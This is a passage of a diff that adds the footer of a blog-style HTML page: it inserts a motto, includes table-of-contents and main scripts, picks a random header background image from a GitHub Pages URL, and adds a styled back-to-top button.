+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
